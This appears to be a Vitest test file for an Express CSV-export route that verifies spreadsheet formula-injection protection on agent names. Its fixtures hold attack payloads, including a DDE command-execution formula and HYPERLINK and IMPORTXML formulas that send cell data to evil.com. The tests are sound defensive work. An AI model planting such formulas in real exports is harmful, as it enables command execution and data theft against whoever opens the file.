import { describe, it, expect, vi, beforeEach } from 'vitest';
import type { Request, Response, NextFunction } from 'express';

// ---------------------------------------------------------------------------
// Mocks — must be declared before importing the router
// ---------------------------------------------------------------------------

vi.mock('../../services/teamPerformance.service', () => ({
  teamPerformanceService: {
    getHistoricalMetrics: vi.fn(),
  },
}));

vi.mock('../../middleware/validate', () => ({
  validate: () => (req: any, res: any, next: any) => next(),
}));

// Import the router and dependencies after mocks are set up
import teamPerformanceRouter from './teamPerformance.routes';
import { teamPerformanceService } from '../../services/teamPerformance.service';

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function createMockReqRes(params: Record<string, string> = {}) {
  const req = {
    params,
    query: { orgId: 'org-123' },
    headers: {},
  } as unknown as Request;

  const res = {
    setHeader: vi.fn(),
    send: vi.fn(),
    status: vi.fn().mockReturnThis(),
    json: vi.fn().mockReturnThis(),
  } as unknown as Response;

  const next = vi.fn() as NextFunction;

  return { req, res, next };
}

/** Helper: extract the CSV sent in res.send() */
function getSentCsv(res: Response): string {
  const sendMock = res.send as ReturnType<typeof vi.fn>;
  expect(sendMock).toHaveBeenCalledOnce();
  return sendMock.mock.calls[0][0];
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe('teamPerformance.routes', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  // -----------------------------------------------------------------------
  // GET /export/csv - CSV formula injection protection
  // -----------------------------------------------------------------------
  describe('GET /export/csv', () => {
    it('should export team performance with normal data', async () => {
      const mockHistoricalMetrics = {
        totalConversations: 100,
        avgResponseTimeMs: 1500,
        avgResolutionTimeMs: 3600000,
        avgCSAT: 4.5,
        handoffCount: 10,
        handoffRate: 0.1,
        agentMetrics: [
          {
            agentId: 'agent-1',
            agentName: 'John Doe',
            conversationsHandled: 50,
            avgResponseTimeMs: 1200,
            avgResolutionTimeMs: 3000000,
            avgCSAT: 4.7,
            handoffCount: 5,
            messageCount: 250,
          },
        ],
      };

      vi.mocked(teamPerformanceService.getHistoricalMetrics).mockResolvedValue(mockHistoricalMetrics);

      const { req, res, next } = createMockReqRes();

      // Call the route handler directly
      const routeLayer = teamPerformanceRouter.stack.find(
        (layer: any) => layer.route?.path === '/export/csv'
      );

      // Get the actual handler (last in stack after middleware)
      const handler = routeLayer?.route?.stack[routeLayer.route.stack.length - 1].handle;

      await handler(req, res, next);

      expect(res.setHeader).toHaveBeenCalledWith('Content-Type', 'text/csv;charset=utf-8');
      expect(res.setHeader).toHaveBeenCalledWith(
        'Content-Disposition',
        'attachment; filename="team-performance.csv"'
      );

      const csv = getSentCsv(res);
      expect(csv).toContain('agentId,agentName,conversationsHandled,avgResponseTimeMs,avgResolutionTimeMs,avgCSAT,handoffCount,messageCount');
      expect(csv).toContain('agent-1,John Doe,50,1200,3000000,4.7,5,250');
    });

    it('should sanitize agentName starting with = (formula injection)', async () => {
      const mockHistoricalMetrics = {
        totalConversations: 10,
        avgResponseTimeMs: 1000,
        avgResolutionTimeMs: 2000000,
        avgCSAT: 4.0,
        handoffCount: 1,
        handoffRate: 0.1,
        agentMetrics: [
          {
            agentId: 'agent-malicious',
            agentName: '=CMD|"/C calc"!A0',
            conversationsHandled: 10,
            avgResponseTimeMs: 1000,
            avgResolutionTimeMs: 2000000,
            avgCSAT: 4.0,
            handoffCount: 1,
            messageCount: 50,
          },
        ],
      };

      vi.mocked(teamPerformanceService.getHistoricalMetrics).mockResolvedValue(mockHistoricalMetrics);

      const { req, res, next } = createMockReqRes();

      const routeLayer = teamPerformanceRouter.stack.find(
        (layer: any) => layer.route?.path === '/export/csv'
      );

      // Get the actual handler (last in stack after middleware)
      const handler = routeLayer?.route?.stack[routeLayer.route.stack.length - 1].handle;

      await handler(req, res, next);

      const csv = getSentCsv(res);
      // The dangerous formula should be prefixed with single quote
      expect(csv).toContain("'=CMD");
    });

    it('should sanitize agentName starting with + (formula injection)', async () => {
      const mockHistoricalMetrics = {
        totalConversations: 10,
        avgResponseTimeMs: 1000,
        avgResolutionTimeMs: 2000000,
        avgCSAT: 4.0,
        handoffCount: 1,
        handoffRate: 0.1,
        agentMetrics: [
          {
            agentId: 'agent-2',
            agentName: '+1234567890',
            conversationsHandled: 10,
            avgResponseTimeMs: 1000,
            avgResolutionTimeMs: 2000000,
            avgCSAT: 4.0,
            handoffCount: 1,
            messageCount: 50,
          },
        ],
      };

      vi.mocked(teamPerformanceService.getHistoricalMetrics).mockResolvedValue(mockHistoricalMetrics);

      const { req, res, next } = createMockReqRes();

      const routeLayer = teamPerformanceRouter.stack.find(
        (layer: any) => layer.route?.path === '/export/csv'
      );

      // Get the actual handler (last in stack after middleware)
      const handler = routeLayer?.route?.stack[routeLayer.route.stack.length - 1].handle;

      await handler(req, res, next);

      const csv = getSentCsv(res);
      // The + at the start should be prefixed with single quote
      expect(csv).toContain("'+1234567890");
    });

    it('should sanitize agentName starting with - (formula injection)', async () => {
      const mockHistoricalMetrics = {
        totalConversations: 10,
        avgResponseTimeMs: 1000,
        avgResolutionTimeMs: 2000000,
        avgCSAT: 4.0,
        handoffCount: 1,
        handoffRate: 0.1,
        agentMetrics: [
          {
            agentId: 'agent-3',
            agentName: '-SUM(A1:A10)',
            conversationsHandled: 10,
            avgResponseTimeMs: 1000,
            avgResolutionTimeMs: 2000000,
            avgCSAT: 4.0,
            handoffCount: 1,
            messageCount: 50,
          },
        ],
      };

      vi.mocked(teamPerformanceService.getHistoricalMetrics).mockResolvedValue(mockHistoricalMetrics);

      const { req, res, next } = createMockReqRes();

      const routeLayer = teamPerformanceRouter.stack.find(
        (layer: any) => layer.route?.path === '/export/csv'
      );

      // Get the actual handler (last in stack after middleware)
      const handler = routeLayer?.route?.stack[routeLayer.route.stack.length - 1].handle;

      await handler(req, res, next);

      const csv = getSentCsv(res);
      // The - at the start should be prefixed with single quote
      expect(csv).toContain("'-SUM");
    });

    it('should sanitize agentName starting with @ (formula injection)', async () => {
      const mockHistoricalMetrics = {
        totalConversations: 10,
        avgResponseTimeMs: 1000,
        avgResolutionTimeMs: 2000000,
        avgCSAT: 4.0,
        handoffCount: 1,
        handoffRate: 0.1,
        agentMetrics: [
          {
            agentId: 'agent-4',
            agentName: '@SUM(A1:A10)',
            conversationsHandled: 10,
            avgResponseTimeMs: 1000,
            avgResolutionTimeMs: 2000000,
            avgCSAT: 4.0,
            handoffCount: 1,
            messageCount: 50,
          },
        ],
      };

      vi.mocked(teamPerformanceService.getHistoricalMetrics).mockResolvedValue(mockHistoricalMetrics);

      const { req, res, next } = createMockReqRes();

      const routeLayer = teamPerformanceRouter.stack.find(
        (layer: any) => layer.route?.path === '/export/csv'
      );

      // Get the actual handler (last in stack after middleware)
      const handler = routeLayer?.route?.stack[routeLayer.route.stack.length - 1].handle;

      await handler(req, res, next);

      const csv = getSentCsv(res);
      // The @ at the start should be prefixed with single quote
      expect(csv).toContain("'@SUM");
    });

    it('should sanitize agentName starting with tab (formula injection)', async () => {
      const mockHistoricalMetrics = {
        totalConversations: 10,
        avgResponseTimeMs: 1000,
        avgResolutionTimeMs: 2000000,
        avgCSAT: 4.0,
        handoffCount: 1,
        handoffRate: 0.1,
        agentMetrics: [
          {
            agentId: 'agent-5',
            agentName: '\t=FORMULA()',
            conversationsHandled: 10,
            avgResponseTimeMs: 1000,
            avgResolutionTimeMs: 2000000,
            avgCSAT: 4.0,
            handoffCount: 1,
            messageCount: 50,
          },
        ],
      };

      vi.mocked(teamPerformanceService.getHistoricalMetrics).mockResolvedValue(mockHistoricalMetrics);

      const { req, res, next } = createMockReqRes();

      const routeLayer = teamPerformanceRouter.stack.find(
        (layer: any) => layer.route?.path === '/export/csv'
      );

      // Get the actual handler (last in stack after middleware)
      const handler = routeLayer?.route?.stack[routeLayer.route.stack.length - 1].handle;

      await handler(req, res, next);

      const csv = getSentCsv(res);
      // The tab at the start should be prefixed with single quote
      expect(csv).toContain("'\t=FORMULA");
    });

    it('should handle null agentName', async () => {
      const mockHistoricalMetrics = {
        totalConversations: 10,
        avgResponseTimeMs: 1000,
        avgResolutionTimeMs: 2000000,
        avgCSAT: 4.0,
        handoffCount: 1,
        handoffRate: 0.1,
        agentMetrics: [
          {
            agentId: 'agent-6',
            agentName: null,
            conversationsHandled: 10,
            avgResponseTimeMs: 1000,
            avgResolutionTimeMs: 2000000,
            avgCSAT: 4.0,
            handoffCount: 1,
            messageCount: 50,
          },
        ],
      };

      vi.mocked(teamPerformanceService.getHistoricalMetrics).mockResolvedValue(mockHistoricalMetrics);

      const { req, res, next } = createMockReqRes();

      const routeLayer = teamPerformanceRouter.stack.find(
        (layer: any) => layer.route?.path === '/export/csv'
      );

      // Get the actual handler (last in stack after middleware)
      const handler = routeLayer?.route?.stack[routeLayer.route.stack.length - 1].handle;

      await handler(req, res, next);

      const csv = getSentCsv(res);
      // Null should be converted to empty string
      expect(csv).toContain('agent-6,,10,1000');
    });

    it('should handle multiple agents with mixed normal and malicious names', async () => {
      const mockHistoricalMetrics = {
        totalConversations: 100,
        avgResponseTimeMs: 1200,
        avgResolutionTimeMs: 3000000,
        avgCSAT: 4.5,
        handoffCount: 10,
        handoffRate: 0.1,
        agentMetrics: [
          {
            agentId: 'agent-1',
            agentName: 'Alice Smith',
            conversationsHandled: 30,
            avgResponseTimeMs: 1000,
            avgResolutionTimeMs: 2500000,
            avgCSAT: 4.8,
            handoffCount: 3,
            messageCount: 150,
          },
          {
            agentId: 'agent-2',
            agentName: '=malicious',
            conversationsHandled: 20,
            avgResponseTimeMs: 1200,
            avgResolutionTimeMs: 2800000,
            avgCSAT: 4.5,
            handoffCount: 2,
            messageCount: 100,
          },
          {
            agentId: 'agent-3',
            agentName: 'Bob Johnson',
            conversationsHandled: 50,
            avgResponseTimeMs: 1400,
            avgResolutionTimeMs: 3200000,
            avgCSAT: 4.3,
            handoffCount: 5,
            messageCount: 250,
          },
        ],
      };

      vi.mocked(teamPerformanceService.getHistoricalMetrics).mockResolvedValue(mockHistoricalMetrics);

      const { req, res, next } = createMockReqRes();

      const routeLayer = teamPerformanceRouter.stack.find(
        (layer: any) => layer.route?.path === '/export/csv'
      );

      // Get the actual handler (last in stack after middleware)
      const handler = routeLayer?.route?.stack[routeLayer.route.stack.length - 1].handle;

      await handler(req, res, next);

      const csv = getSentCsv(res);
      // Normal names should remain unchanged
      expect(csv).toContain('Alice Smith');
      expect(csv).toContain('Bob Johnson');
      // Malicious name should be sanitized
      expect(csv).toContain("'=malicious");
    });

    it('should handle empty agentMetrics array', async () => {
      const mockHistoricalMetrics = {
        totalConversations: 0,
        avgResponseTimeMs: 0,
        avgResolutionTimeMs: 0,
        avgCSAT: 0,
        handoffCount: 0,
        handoffRate: 0,
        agentMetrics: [],
      };

      vi.mocked(teamPerformanceService.getHistoricalMetrics).mockResolvedValue(mockHistoricalMetrics);

      const { req, res, next } = createMockReqRes();

      const routeLayer = teamPerformanceRouter.stack.find(
        (layer: any) => layer.route?.path === '/export/csv'
      );

      // Get the actual handler (last in stack after middleware)
      const handler = routeLayer?.route?.stack[routeLayer.route.stack.length - 1].handle;

      await handler(req, res, next);

      expect(res.setHeader).toHaveBeenCalledWith('Content-Type', 'text/csv;charset=utf-8');
      expect(res.setHeader).toHaveBeenCalledWith(
        'Content-Disposition',
        'attachment; filename="team-performance.csv"'
      );

      const csv = getSentCsv(res);
      // Empty array should return empty CSV
      expect(csv).toBe('');
    });
  });

  // -----------------------------------------------------------------------
  // Real-world attack payloads
  // -----------------------------------------------------------------------
  describe('real-world attack payloads', () => {
    it('should protect against DDE (Dynamic Data Exchange) attack', async () => {
      const mockHistoricalMetrics = {
        totalConversations: 10,
        avgResponseTimeMs: 1000,
        avgResolutionTimeMs: 2000000,
        avgCSAT: 4.0,
        handoffCount: 1,
        handoffRate: 0.1,
        agentMetrics: [
          {
            agentId: 'agent-dde',
            agentName: '=CMD|"/C calc"!A0',
            conversationsHandled: 10,
            avgResponseTimeMs: 1000,
            avgResolutionTimeMs: 2000000,
            avgCSAT: 4.0,
            handoffCount: 1,
            messageCount: 50,
          },
        ],
      };

      vi.mocked(teamPerformanceService.getHistoricalMetrics).mockResolvedValue(mockHistoricalMetrics);

      const { req, res, next } = createMockReqRes();

      const routeLayer = teamPerformanceRouter.stack.find(
        (layer: any) => layer.route?.path === '/export/csv'
      );

      // Get the actual handler (last in stack after middleware)
      const handler = routeLayer?.route?.stack[routeLayer.route.stack.length - 1].handle;

      await handler(req, res, next);

      const csv = getSentCsv(res);
      // DDE attack should be neutralized
      expect(csv).toContain("'=CMD");
    });

    it('should protect against HYPERLINK data exfiltration', async () => {
      const mockHistoricalMetrics = {
        totalConversations: 10,
        avgResponseTimeMs: 1000,
        avgResolutionTimeMs: 2000000,
        avgCSAT: 4.0,
        handoffCount: 1,
        handoffRate: 0.1,
        agentMetrics: [
          {
            agentId: 'agent-hyperlink',
            agentName: '=HYPERLINK("https://evil.com/"&A2,"Click")',
            conversationsHandled: 10,
            avgResponseTimeMs: 1000,
            avgResolutionTimeMs: 2000000,
            avgCSAT: 4.0,
            handoffCount: 1,
            messageCount: 50,
          },
        ],
      };

      vi.mocked(teamPerformanceService.getHistoricalMetrics).mockResolvedValue(mockHistoricalMetrics);

      const { req, res, next } = createMockReqRes();

      const routeLayer = teamPerformanceRouter.stack.find(
        (layer: any) => layer.route?.path === '/export/csv'
      );

      // Get the actual handler (last in stack after middleware)
      const handler = routeLayer?.route?.stack[routeLayer.route.stack.length - 1].handle;

      await handler(req, res, next);

      const csv = getSentCsv(res);
      // HYPERLINK attack should be neutralized
      expect(csv).toContain("'=HYPERLINK");
    });

    it('should protect against IMPORTXML remote code execution', async () => {
      const mockHistoricalMetrics = {
        totalConversations: 10,
        avgResponseTimeMs: 1000,
        avgResolutionTimeMs: 2000000,
        avgCSAT: 4.0,
        handoffCount: 1,
        handoffRate: 0.1,
        agentMetrics: [
          {
            agentId: 'agent-importxml',
            agentName: '=IMPORTXML(CONCAT("http://evil.com/?v=",A2),"//a")',
            conversationsHandled: 10,
            avgResponseTimeMs: 1000,
            avgResolutionTimeMs: 2000000,
            avgCSAT: 4.0,
            handoffCount: 1,
            messageCount: 50,
          },
        ],
      };

      vi.mocked(teamPerformanceService.getHistoricalMetrics).mockResolvedValue(mockHistoricalMetrics);

      const { req, res, next } = createMockReqRes();

      const routeLayer = teamPerformanceRouter.stack.find(
        (layer: any) => layer.route?.path === '/export/csv'
      );

      // Get the actual handler (last in stack after middleware)
      const handler = routeLayer?.route?.stack[routeLayer.route.stack.length - 1].handle;

      await handler(req, res, next);

      const csv = getSentCsv(res);
      // IMPORTXML attack should be neutralized
      expect(csv).toContain("'=IMPORTXML");
    });
  });

  // -----------------------------------------------------------------------
  // Error handling
  // -----------------------------------------------------------------------
  describe('error handling', () => {
    it('should call next with error when service fails', async () => {
      const serviceError = new Error('Team performance service unavailable');
      vi.mocked(teamPerformanceService.getHistoricalMetrics).mockRejectedValue(serviceError);

      const { req, res, next } = createMockReqRes();

      const routeLayer = teamPerformanceRouter.stack.find(
        (layer: any) => layer.route?.path === '/export/csv'
      );

      // Get the actual handler (last in stack after middleware)
      const handler = routeLayer?.route?.stack[routeLayer.route.stack.length - 1].handle;

      await handler(req, res, next);

      expect(next).toHaveBeenCalledWith(serviceError);
      expect(res.send).not.toHaveBeenCalled();
    });
  });
});
